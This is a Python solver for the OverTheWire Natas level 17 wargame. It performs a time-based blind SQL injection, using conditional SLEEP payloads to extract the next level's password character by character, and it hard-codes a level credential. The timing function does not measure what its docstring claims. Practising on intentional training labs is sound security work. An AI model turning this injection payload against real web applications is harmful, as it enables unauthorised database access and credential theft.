import string
import base64
import time
import urllib3
import urllib.parse

def create_basic_auth_header(username: str, password: str) -> dict:
    """Generates a Basic Authentication header dictionary."""
    credentials = f"{username}:{password}"
    encoded_credentials = base64.b64encode(credentials.encode("utf-8")).decode(
        "utf-8"
    )
    return {"Authorization": f"Basic {encoded_credentials}"}


def get_response_time(
    http_pool: urllib3.PoolManager,
    url: str,
    fields: dict = None,
    headers: dict = None,
) -> dict:
    """Measures pure server wait time (TTFB minus client upload time)

    mimicking cURL's (time_starttransfer - time_posttransfer).
    """
    if headers is None:
        headers = {}

    # 1. Explicitly URL-encode the payload dictionary into a query string
    # This matches what curl --data-urlencode does under the hood.
    encoded_body = urllib.parse.urlencode(fields) if fields else None

    # 1. Mark timestamp before transmission starts
    t_start_upload = time.perf_counter()

    # 2. Execute POST request (preload_content=False keeps the socket open for manual reading)
    response = http_pool.request(
        "POST", url, body=encoded_body, headers=headers, preload_content=False
    )

    # 3. Mark timestamp when the client finishes sending the payload
    t_post_transfer = time.perf_counter()

    # Clean up / release connection back to the pool
    response.release_conn()

    # Calculations
    server_wait_time = t_post_transfer - t_start_upload

    return {
        "server_wait_time": server_wait_time,  # Target metric (cURL equivalent)
        "status_code": response.status,
    }


# ==========================================
# MAIN FUNCTION
# ==========================================
if __name__ == "__main__":
    # CONSTANTS
    CREDENTIALS = {"username": "natas17", "pwd": "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"}
    API_URL = f"http://{CREDENTIALS["username"]}.natas.labs.overthewire.org"
    SLEEP_DURATION = 3 # in seconds

    # Combine digits, lowercase letters, and uppercase letters
    char_list = list(string.digits + string.ascii_letters)
    guessed_pwd = ""
    
    # Create a PoolManager (reusable connection session)
    http = urllib3.PoolManager()

    for i in range(1, len(CREDENTIALS["pwd"]) + 1): # assuming the password for each user is the same length
        response_time = 0
        MATCH_FOUND = False

        for char in char_list: # proceed guessing the next character
            try:
                
                # Crafting SQL query
                query = f'" AND (SELECT CASE WHEN (BINARY substring(password,1,{str(i)}) = "{guessed_pwd}{char}") THEN SLEEP({SLEEP_DURATION}) ELSE SLEEP(0) END FROM users WHERE username = "natas18" LIMIT 1) IS NULL -- '
                payload = {"username": query}

                # Setup credentials
                auth_headers = create_basic_auth_header(CREDENTIALS["username"], CREDENTIALS["pwd"])

                # Optional: merge with other headers like Content-Type if needed
                headers = {**auth_headers, "Content-Type": "application/x-www-form-urlencoded"}

                # Measure the performance
                metrics = get_response_time(http, API_URL, fields=payload, headers=headers)

                if metrics['status_code'] != 200:
                   raise Exception(f"Returned status code of {metrics["status_code"]}")

                # check sucess condition
                # Increment the index so the loop moves to the next character
                if metrics['server_wait_time'] > SLEEP_DURATION:
                    guessed_pwd += char
                    print(f"[+] Progress: {guessed_pwd} ({i}/{len(CREDENTIALS["pwd"])})")
                    MATCH_FOUND = True
                    break    
            except Exception as err:
                print(f"HTTP Error for query: {err}")

        if not MATCH_FOUND:
            print("\n[-] No matching character found, stopping.")
            break

    print("\n[!] End of program")
    print(f"Guessed password: {guessed_pwd}")

           
         